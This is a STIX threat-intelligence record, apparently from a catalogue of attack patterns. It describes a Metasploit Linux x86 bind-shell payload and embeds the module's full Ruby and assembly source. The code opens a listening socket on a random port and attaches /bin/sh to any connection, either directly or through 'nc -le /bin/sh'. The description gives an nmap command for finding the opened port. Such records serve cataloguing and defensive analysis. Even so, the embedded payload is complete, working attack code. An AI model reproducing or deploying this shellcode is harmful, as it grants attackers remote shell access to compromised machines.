{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--670e637d-3667-4fd7-a92a-723cf09c90cd",
    "created": "2024-08-14T16:33:19.428692Z",
    "modified": "2024-08-14T16:33:19.428695Z",
    "name": "Linux Command Shell, Bind TCP Random Port Inline",
    "description": " Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x86/shell_bind_tcp_random_port.rb",
            "external_id": "shell_bind_tcp_random_port.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port.asm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 57\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Bind TCP Random Port Inline',\n      'Description'   => %q{\n        Listen for a connection in a random port and spawn a command shell.\n        Use nmap to discover the open port: 'nmap -sS target -p-'.\n      },\n      'Author'        => ['Geyslan G. Bem <geyslan[at]gmail.com>',\n                          'Aleh Boitsau <infosecurity[at]ya.ru>'],\n      'License'       => BSD_LICENSE,\n      'References'    => [ ['URL', 'https://github.com/geyslan/SLAE/blob/master/improvements/tiny_shell_bind_tcp_random_port.asm'],\n                           ['EDB', '41631'] ],\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X86\n      ))\n  end\n\n  def generate(_opts = {})\n    unless self.available_space.nil? || self.available_space >= 57\n      payload = <<-EOS\n        preparation:\n          xor edx, edx     ;zeroed edx\n          push edx         ;push NULL into stack\n          push 0x68732f2f  ;-le//bin//sh\n          push 0x6e69622f\n          push 0x2f656c2d\n          mov edi, esp     ;store a pointer to -le//bin//sh into edi\n          push edx         ;push NULL into stack\n          push 0x636e2f2f  ;/bin//nc\n          push 0x6e69622f\n          mov ebx, esp     ;store a pointer to filename (/bin//nc) into ebx\n\n        execve_call:\n          push edx         ;push NULL into stack\n          push edi         ;pointer to -le//bin//sh\n          push ebx         ;pointer to filename (/bin//nc)\n          mov ecx, esp     ;argv[]\n          xor eax, eax     ;zeroed eax\n          mov al,11        ;define execve()\n          int 0x80         ;run syscall\n     EOS\n   else\n     payload = <<-EOS\n        ; Avoiding garbage\n        xor ebx, ebx\n        mul ebx\n\n        ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)\n        mov al, 102\t\t; syscall 102 - socketcall\n        inc ebx\t\t\t; socketcall type (sys_socket 1)\n\n        push edx\t\t; IPPROTO_IP = 0 (int)\n        push ebx\t\t; SOCK_STREAM = 1 (int)\n        push 2\t\t\t; AF_INET = 2 (int)\n        mov ecx, esp\t\t; ptr to argument array\n        int 0x80\t\t; kernel interrupt\n\n        ; int listen(int sockfd, int backlog);\n        ; listen(sockfd, int);\n\n        ; listen arguments\n        push edx\t\t; put zero\n        push eax\t\t; put the file descriptor returned by socket()\n        mov ecx, esp\t\t; ptr to argument array\n\n        mov al, 102\t\t; syscall 102 - socketcall\n        mov bl, 4\t\t; socketcall type (sys_listen 4)\n        int 0x80\t\t; kernel interrupt\n\n        ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);\n        ; accept(sockfd, NULL, NULL)\n\n        mov al, 102\t\t; syscall 102 - socketcall\n        inc ebx\t\t\t; socketcall type (sys_accept 5)\n        int 0x80\t\t; kernel interrupt\n\n        ; int dup2(int oldfd, int newfd);\n        ; dup2(clientfd, ...)\n\n        pop ecx\t\t\t; pop the sockfd integer to use as the loop counter ecx\n        xchg ebx, eax\t\t; swapping registers values to put the accepted sockfd (client) in ebx as argument in next syscall (dup2)\n\n      dup_loop:\n        push 63\t\t\t; syscall 63 - dup2\n        pop eax\n        int 0x80\t\t; kernel interrupt\n\n        dec ecx\t\t\t; file descriptor and loop counter\n        jns dup_loop\n\n        ; Finally, using execve to substitute the actual process with /bin/sh\n        ; int execve(const char *filename, char *const argv[], char *const envp[]);\n        ; exevcve(\"/bin/sh\", NULL, NULL)\n\n        mov al, 11\t\t; execve syscall\n\n        ; execve string argument\n        ; stack already contains NULL on top\n        push 0x68732f2f\t\t; \"//sh\"\n        push 0x6e69622f\t\t; \"/bin\"\n\n        mov ebx, esp\t\t; ptr to \"/bin//sh\" string\n\n        inc ecx\t\t\t; zero to argv\n                    ; zero to envp (edx)\n\n        int 0x80\n      EOS\n    end\n\n   Metasm::Shellcode.assemble(Metasm::X86.new, payload).encode_string\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}